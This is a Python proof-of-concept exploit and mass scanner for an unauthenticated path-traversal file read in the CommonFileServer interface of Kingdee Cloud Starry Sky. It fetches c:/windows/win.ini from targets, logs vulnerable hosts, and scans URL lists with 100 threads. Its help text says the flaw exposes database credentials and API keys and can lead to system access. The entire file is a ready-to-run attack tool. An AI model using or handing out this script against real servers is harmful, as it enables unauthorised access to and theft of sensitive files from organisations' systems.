# -*- coding: utf-8 -*-
import argparse, sys, requests
import base64
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

   ▄█   ▄█▄  ▄█  ███▄▄▄▄   ████████▄  ████████▄     ▄████████    ▄████████    ▄████████  ▄█   ▄█          ▄████████    ▄████████    ▄████████    ▄████████ ████████▄   ▄█  ███▄▄▄▄      ▄██████▄  
  ███ ▄███▀ ███  ███▀▀▀██▄ ███   ▀███ ███   ▀███   ███    ███   ███    ███   ███    ███ ███  ███         ███    ███   ███    ███   ███    ███   ███    ███ ███   ▀███ ███  ███▀▀▀██▄   ███    ███ 
  ███▐██▀   ███▌ ███   ███ ███    ███ ███    ███   ███    █▀    ███    █▀    ███    █▀  ███▌ ███         ███    █▀    ███    ███   ███    █▀    ███    ███ ███    ███ ███▌ ███   ███   ███    █▀  
 ▄█████▀    ███▌ ███   ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄     ███▌ ███        ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄███▄▄▄       ███    ███ ███    ███ ███▌ ███   ███  ▄███        
▀▀█████▄    ███▌ ███   ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀     ███▌ ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀███████████ ███    ███ ███▌ ███   ███ ▀▀███ ████▄  
  ███▐██▄   ███  ███   ███ ███    ███ ███    ███   ███    █▄    ███    █▄    ███        ███  ███         ███    █▄  ▀███████████   ███    █▄    ███    ███ ███    ███ ███  ███   ███   ███    ███ 
  ███ ▀███▄ ███  ███   ███ ███   ▄███ ███   ▄███   ███    ███   ███    ███   ███        ███  ███▌    ▄   ███    ███   ███    ███   ███    ███   ███    ███ ███   ▄███ ███  ███   ███   ███    ███ 
  ███   ▀█▀ █▀    ▀█   █▀  ████████▀  ████████▀    ██████████   ██████████   ███        █▀   █████▄▄██   ██████████   ███    ███   ██████████   ███    █▀  ████████▀  █▀    ▀█   █▀    ████████▀  
  ▀                                                                                          ▀                        ███    ███                                                                  


                                       tag:  KindDee-file-Reading                                  
                                       @version: 1.0.0   @author: Despacito096           
"""
    print(test)


def exp(target):
    url = target + "/CommonFileServer/c:/windows/win.ini"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
    }
    try:
        res = requests.get(url, headers=headers, timeout=8, verify=False).text
        # print(res)
        if "MAPI=1" in res:
            print(f"[+] {target} exists file-reading")
            with open("result1.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} doesn't exist file-reading")
    except:
        print(f"[!]{target} access error!")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description='Due to improper permission settings at the CommonFileServer interface of the Kingdee Cloud and Starry Sky, unauthorized attackers can exploit this vulnerability to access arbitrary files on the server, including database credentials, API keys, configuration files, etc., in order to obtain system permissions and sensitive information.')
    parser.add_argument("-u", "--url", dest="url", type=str,
                        help=" example: http://www.example.com,USED FOR SINGLE TEST")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt  USED FOR ABUNDANT TESTS")
    args = parser.parse_args()
    if args.url and not args.file:
        exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(exp, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()